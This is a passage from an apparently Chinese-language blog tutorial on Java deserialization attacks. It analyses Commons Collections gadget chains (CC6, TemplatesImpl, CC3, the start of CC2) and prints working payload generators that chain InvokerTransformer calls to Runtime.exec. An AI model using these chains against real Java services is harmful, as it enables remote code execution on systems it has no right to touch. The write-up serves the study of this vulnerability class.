Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outermap</span> <span class="operator">=</span> LazyMap.decorate(innermap,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(clazz,outermap);</span><br><span class="line"></span><br><span class="line">       <span class="type">Map</span> <span class="variable">proxymap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">       handler = (InvocationHandler)constructor.newInstance(clazz,proxymap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="总结-1">总结</h6>
<p>InvocationHandler#readObject-&gt;Proxy#anyMethod-&gt;InvocationHandler#invoke()-&gt;lazymap#get-&gt;transformer</p>
<h5 id="cc6">CC6</h5>
<p>在ysoserial中，CommonCollections6可以是commons-collections这个库中相对比较通用的利用链，解决了较高版本的利用问题。</p>
<p>直接来看p神版本的简化利用链</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Gadget chain:</span></span><br><span class="line"><span class="comment"> java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment"> java.util.HashMap.readObject()</span></span><br><span class="line"><span class="comment"> java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment"> org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment"> java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment"> java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>从上面的这一流程来看，前面的东西都是已经分析过的事情，都是一个map对象序列化之后，输入进去反序列化，触发readobject再触发hash，hash里面有一个hashcode，这个hashcode里面会调用一个getxxx()的方法。</p>
<p>最终我们找到的利用类是<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code>在他的getvalue当中调用了this.map.get，而其hashcode方法当中调用了getvalue方法，如下图所示。有了这个对象我们可以不再依赖于代理的方式，通过handler的invoke方法，调用getvalue</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Entry</span>, KeyValue, Serializable &#123;</span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8453869361373831205L</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line"> <span class="built_in">this</span>.map = map;</span><br><span class="line"> <span class="built_in">this</span>.key = key;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> Object <span class="title function_">getKey</span><span class="params">()</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">this</span>.key;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// ...</span></span><br><span class="line"> <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line"> <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line"> <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^</span><br><span class="line">(value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以想要触发LazyMap的利用连，就要找到谁可以调用TiedMapEntry#hashcode。在java.util.HashMap#readObject中就可以找到HashMap#hash()的调用，而HashMap#hash()会进一步的触发map对象里面的hashcode方法。所以，我们只需要让key为TiedMapEntry对象，就可以连接成gadget链。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashMap</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">AbstractMap</span>&lt;K,V&gt;</span><br><span class="line"> <span class="keyword">implements</span> <span class="title class_">Map</span>&lt;K,V&gt;, Cloneable, Serializable &#123;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// ...</span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line"> <span class="type">int</span> h;</span><br><span class="line"> <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line"> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"> <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden</span></span><br><span class="line">stuff</span><br><span class="line"> s.defaultReadObject();</span><br><span class="line"> <span class="comment">// ...</span></span><br><span class="line"> <span class="comment">// Read the keys and values, and put the mappings in the</span></span><br><span class="line">HashMap</span><br><span class="line"> <span class="title function_">for</span> <span class="params">(<span class="type">int</span> i = <span class="number">0</span>; i &lt; mappings; i++)</span> &#123;</span><br><span class="line"> <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"> <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line"> <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"> <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line"> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>为了避免本地调试时发生命令执行，要在构造LazyMap的时候先用一个人畜无害的FakeTransformers对象，等最后要生成payload的时候再替换回去。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;exec&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerchain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outermap</span> <span class="operator">=</span> LazyMap.decorate(innermap,transformerchain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//构造完恶意的LazyMap</span></span><br></pre></td></tr></table></figure>
<p>最终构造payload如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerchain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outermap</span> <span class="operator">=</span> LazyMap.decorate(innermap,transformerchain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造完恶意的LazyMap。开始构造Tied</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outermap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outermap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerchain, transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        FileOutputStream fos = new FileOutputStream(&quot;./Test.ser&quot;);</span></span><br><span class="line"><span class="comment">//        ObjectOutputStream oos = new ObjectOutputStream(fos);</span></span><br><span class="line"><span class="comment">//        oos.writeObject(expMap);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.encodeBase64String(barr.toByteArray()));</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC8.png" class>
<h6 id="总结-2">总结</h6>
<p>在这条链的学习过程中，我觉得这条链的利用思路更加清晰，而且他的利用结果也是显而易见的，能够适应高版本的环境，也可以对低版本的java进行攻击。在这一部分当中我们不再依赖于handler而是使用tme的触发点。我们找到tme的hashcode可以触发lazymap的get方法，通过之前的构造我们可以构造出一个含有恶意transformer的lazymap，把lazymap放到tme里面，再通过hashmap的readobject触发tme的hashcode，所以最后把tme放到hashmap里面。其中仍有一些细节，但是这基本上就是大体流程了。</p>
<h5 id="tmplatesimpl的半截链">TmplatesImpl的半截链</h5>
<p>在反序列化利用当中逃不开的一点就是不出网的利用方式，并且我们希望攻击方式可以多变，甚至可以植入一些内存马。要想达到这些目的我们不出意外的会遇到半条利用链。这半条利用链能够加载字节码，理论上在静态代码段或是构造方法当中写的代码都将会在这半条链里面执行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance()/会进行初始化 -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>
<p>一个简单的利用方式如下所示：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloTemplatesImpl</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] code = “classbytecode”</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">    setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">    setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    obj.newTransformer();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>_bytecodes 是由字节码组成的数组；</p>
<p>_name 可以是任意字符串，只要不为null即可；</p>
<p>_tfactory 需要是一个 TransformerFactoryImpl 对象，因为
TemplatesImpl#defineTransletClasses() 方法里有调用到
_tfactory.getExternalExtensionsMap() ，如果是null会出错</p>
<h5 id="cc3">CC3</h5>
<p>从TemplatesImpl的半条链的运行流程来看，我们要想成功利用这半条链，我们需要知道哪里可以调用TemplatesImpl#getOutputProperties()
以及
TemplatesImpl#newTransformer()。CC3利用链给了我们一个思路com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter，他的构造方法调用了两者之一的TemplatesImpl#newTransformer()</p>
<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC11.png" class>
<p>结合我们之前的Transformer我们很容易就可以给出下面的验证代码段</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1and6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldname, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = “bytecode”;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedtransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outermap</span> <span class="operator">=</span> TransformedMap.decorate(innermap, <span class="literal">null</span>, chainedtransformer);</span><br><span class="line">        outermap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="cc2">CC2</h5>
<h6 id="priorityqueue利链">PriorityQueue利⽤链</h6>
<p>CC2利用链之所以能成其根本在于java.util.PriorityQueue类，其中java.util.PriorityQueue有一个自己的readObject()方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">        s.readInt();</span><br><span class="line"></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);</span><br><span class="line">        queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">        <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>而<code>org.apache.commons.collections4.comparators.TransformingComparator</code>中有调用transform()方法的函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">    <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以目标就很明确了，起点是PriorityQueue#readObject终点是TransformingComparator#compare()然后就是通过transformer引发一系列代码执行的过程了。</p>
<p>看⼀下他们是怎么连接起来的。 如下式关于两者的调试过程</p>
<h6 id="调试过程">调试过程</h6>
<p>我们还是以一种调试者的角度来看待这个问题，开始调试，首先我们在PriorityQueue的readObject开始下断点</p>
<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC16.png" class>
<p>然后进入到heapify()这个函数当中</p>
